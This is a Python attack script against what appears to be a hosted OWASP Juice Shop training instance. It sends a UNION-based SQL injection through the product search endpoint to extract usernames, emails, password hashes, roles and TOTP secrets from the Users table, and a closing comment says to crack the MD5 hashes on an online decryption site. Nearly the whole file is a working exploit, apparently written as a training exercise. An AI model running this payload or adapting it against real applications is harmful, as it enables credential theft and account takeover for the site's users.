import requests
import json

# View the database dump to see how we get there

# "id": 0,
#"name": "Users",
#"description": "Users",
#"price": "CREATE TABLE `Users` (
#`id` INTEGER PRIMARY KEY AUTOINCREMENT, 
#`username` VARCHAR(255) DEFAULT '', 
#`email` VARCHAR(255) UNIQUE, 
#`password` VARCHAR(255), 
#`role` VARCHAR(255) DEFAULT 'customer', 
#`deluxeToken` VARCHAR(255) DEFAULT '', 
#`lastLoginIp` VARCHAR(255) DEFAULT '0.0.0.0', 
#`profileImage` VARCHAR(255) DEFAULT '/assets/public/images/uploads/default.svg', 
#`totpSecret` VARCHAR(255) DEFAULT '', 
#`isActive` TINYINT(1) DEFAULT 1, 
#`createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `deletedAt` DATETIME)"

def response_content(resp):
    print(json.dumps(resp.json(), indent=4))

def search_for(value):
    base_url="https://juice-shop-kha.herokuapp.com/rest/products/search?q="
    response = requests.get(base_url + value, headers={'Accept': 'application/json'})
    response_content(response)


search_for(";;;')) UNION ALL Select id, username, email, password, role, totpSecret, NULL, NULL, NULL From Users --")

# Get the md5 password and go to https://md5decrypt.net/
